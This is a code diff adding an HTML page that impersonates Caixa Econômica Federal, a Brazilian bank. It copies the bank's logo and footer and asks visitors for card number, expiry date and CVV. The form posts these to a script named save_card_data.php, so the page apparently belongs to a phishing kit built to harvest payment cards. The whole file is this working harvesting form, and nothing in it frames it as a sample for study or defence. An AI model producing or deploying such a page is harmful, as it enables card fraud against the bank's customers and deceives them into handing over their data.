@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dados do Cartão</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <header class="header">
+        <img src="assets/images/logocxc-removebg-preview.png" alt="Logo Caixa" class="logo">
+    </header>
+    <main>
+        <h1>Preencha os Dados do Cartão</h1>
+        <form method="POST" action="../src/save_card_data.php">
+            <label for="card_number">Número do Cartão:</label>
+            <input type="text" id="card_number" name="card_number" required>
+            <label for="card_expiry">Validade:</label>
+            <input type="text" id="card_expiry" name="card_expiry" required>
+            <label for="card_cvv">CVV:</label>
+            <input type="text" id="card_cvv" name="card_cvv" required>
+            <button type="submit">Enviar</button>
+        </form>
+    </main>
+    <footer>
+        <p>Caixa Econômica Federal | Atendimento 24h</p>
+    </footer>
+</body>
+</html>
